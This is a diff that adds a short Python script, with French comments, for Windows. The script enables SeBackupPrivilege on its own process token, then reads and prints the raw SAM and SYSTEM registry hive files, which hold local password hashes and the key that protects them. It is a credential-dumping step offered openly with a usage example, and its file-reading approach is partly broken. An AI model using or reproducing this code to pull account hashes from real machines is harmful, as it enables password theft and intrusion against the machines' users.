@@ -1,0 +1,60 @@
+import win32api
+import win32security
+# pour windows
+def acces_droits(privilege_str):
+    
+    procesus_en_cours = win32api.GetCurrentProcess() # Récupère le processus en cours
+
+
+    acces = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY # Droits d'accès au token du processus en cours
+
+
+    token = win32security.OpenProcessToken(procesus_en_cours, acces)   # Ouvre le token du processus en cours
+        
+        
+    privilege_id = win32security.LookupPrivilegeValue(None, privilege_str) # Récupère l'identifiant du privilège
+        
+        
+    win32security.AdjustTokenPrivileges(token, False, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]) # Active le privilège
+
+    if win32api.GetLastError() == 0: # Si la fonction GetLastError() retourne 0, cela signifie que la fonction a réussi
+        
+     print(f"Privilege {privilege_str} enabled.") # Affiche un message de succès
+    else:  
+        print(f"Failed to enable privilege {privilege_str}.") # Affiche un message d'erreur
+
+def read_sam_file(): # Fonction pour lire le fichier SAM
+   
+        
+        acces_droits(win32security.SE_BACKUP_NAME) # Active le privilège SeBackupPrivilege
+        
+        sam_file = r"C:\Windows\System32\config\SAM" # Chemin du fichier SAM
+        with open(sam_file, 'rb') as f:
+            data = f.read()
+        if data:
+            return data
+        else:
+            return "Erreur lors de la lecture du fichier SAM."        
+
+    
+    
+
+def read_system_file():
+    
+        
+        acces_droits(win32security.SE_BACKUP_NAME) # Active le privilège SeBackupPrivilege
+        
+        system_file = r"C:\Windows\System32\config\SYSTEM"
+        with open(system_file, 'rb') as f:
+            data = f.read()
+        if data:
+            return data
+        else:
+             print("Erreur lors de la lecture du fichier SYSTEM.")
+    
+
+# Exemple d'utilisation
+sam_data = read_sam_file()
+system_data = read_system_file()
+print(sam_data)
+print(system_data)
